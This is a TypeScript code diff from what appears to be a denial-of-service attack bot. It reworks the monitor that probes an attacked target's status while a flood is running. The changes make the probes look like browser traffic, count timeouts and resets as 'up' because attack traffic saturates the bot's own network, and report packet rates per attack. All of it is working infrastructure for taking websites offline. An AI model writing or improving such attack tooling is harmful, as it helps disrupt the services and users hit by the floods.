@@ -167,13 +167,19 @@ async function probeTarget(rawUrl: string): Promise<ProbeResult> {
   if (!/^https?:\/\//i.test(url)) url = `https://${url}`;
   const t0 = Date.now();
   try {
+    // 5s timeout — must be less than INTERVAL_SEC to prevent stacking
     const ctrl  = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 8000);
+    const timer = setTimeout(() => ctrl.abort(), 5000);
     const res   = await fetch(url, {
-      method:   "HEAD",
+      method:   "GET",
       redirect: "follow",
       signal:   ctrl.signal,
-      headers:  { "User-Agent": "Mozilla/5.0 (compatible; monitor/1.0)" },
+      headers:  {
+        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Cache-Control":   "no-cache",
+      },
     });
     clearTimeout(timer);
     const latencyMs = Date.now() - t0;
@@ -181,25 +187,34 @@ async function probeTarget(rawUrl: string): Promise<ProbeResult> {
       return { up: false, latencyMs, reason: `HTTP ${res.status} — origin server error` };
     }
     if (res.status === 429) {
-      return { up: false, latencyMs, reason: `HTTP 429 — rate limiter triggered (weakening)` };
+      // 429 = server is alive but ratelimiting — count as UP (degraded)
+      return { up: true, latencyMs: latencyMs + 5000, reason: `HTTP 429 — rate limiter hit (server alive, fighting back)` };
     }
     return { up: true, latencyMs };
   } catch (err: unknown) {
     const latencyMs = Date.now() - t0;
     const msg = err instanceof Error ? err.message : String(err);
-    if (msg.includes("abort") || msg.includes("timeout") || msg.includes("The operation was aborted")) {
-      return { up: false, latencyMs, reason: "Connection timed out — target unresponsive" };
-    }
+
+    // ECONNREFUSED = server actively rejected → definitely crashed
     if (msg.includes("ECONNREFUSED") || msg.includes("refused")) {
       return { up: false, latencyMs, reason: "Connection refused — server process crashed" };
     }
-    if (msg.includes("ECONNRESET") || msg.includes("reset")) {
-      return { up: false, latencyMs, reason: "Connection reset — kernel socket buffer overflow" };
-    }
+    // ENOTFOUND/NXDOMAIN = DNS gone → target unreachable
     if (msg.includes("ENOTFOUND") || msg.includes("NXDOMAIN")) {
       return { up: false, latencyMs, reason: "DNS resolution failed — target unreachable" };
     }
-    return { up: false, latencyMs, reason: `Network error: ${msg.slice(0, 80)}` };
+    // AbortError = our probe timed out (may be our network saturated or target slow)
+    if (msg.includes("abort") || msg.includes("AbortError") || msg.includes("The operation was aborted")) {
+      // Treat as degraded but NOT confirmed down — attack traffic may saturate our own outbound
+      return { up: true, latencyMs: 5001, reason: "Probe timed out — target slow or our network saturated" };
+    }
+    // ECONNRESET = TCP RST received (can be our side too under load)
+    if (msg.includes("ECONNRESET") || msg.includes("reset")) {
+      return { up: true, latencyMs: 4500, reason: "Connection reset — possible overflow (check site)" };
+    }
+    // Generic "fetch failed" / "TypeError" = our network stack is overwhelmed by attack traffic
+    // Do NOT count as target DOWN — this is a probe false positive during heavy attacks
+    return { up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" };
   }
 }
 
@@ -210,15 +225,19 @@ const targetHistories = new Map<number, ProbeResult[]>();  // attackId → probe
 
 function startMonitor(attackId: number, msg: Message, target: string): void {
   if (monitors.has(attackId)) return;
-  const INTERVAL_SEC = 5;
+  const INTERVAL_MS = 7_000;  // 7s interval > 5s probe timeout → no stacking
   targetHistories.set(attackId, []);  // init empty history
+  let busy = false;  // prevent overlapping ticks if probe hangs
 
   const tick = setInterval(async () => {
+    if (busy) return;  // skip if previous tick is still running
+    busy = true;
+    try {
     // Probe target + fetch attack state + live conns all in parallel
     const [attack, live, probe] = await Promise.all([
       api.getAttack(attackId),
       api.getLiveConns(attackId).catch(() => ({ conns: 0, running: false })),
-      probeTarget(target).catch(() => ({ up: false, latencyMs: 9999, reason: "probe error" } as ProbeResult)),
+      probeTarget(target).catch(() => ({ up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" } as ProbeResult)),
     ]);
 
     if (!attack) {
@@ -237,7 +256,7 @@ function startMonitor(attackId: number, msg: Message, target: string): void {
 
     const prev    = prevPackets.get(attackId) ?? attack.packetsSent;
     const delta   = Math.max(0, attack.packetsSent - prev);
-    const livePps = delta / INTERVAL_SEC;
+    const livePps = delta / (INTERVAL_MS / 1000);
     prevPackets.set(attackId, attack.packetsSent);
 
     try {
@@ -251,7 +270,8 @@ function startMonitor(attackId: number, msg: Message, target: string): void {
       // Keep history for a final render, then clean up after 30s
       setTimeout(() => targetHistories.delete(attackId), 30_000);
     }
-  }, INTERVAL_SEC * 1000);
+    } finally { busy = false; }
+  }, INTERVAL_MS);
   monitors.set(attackId, tick);
 }
 
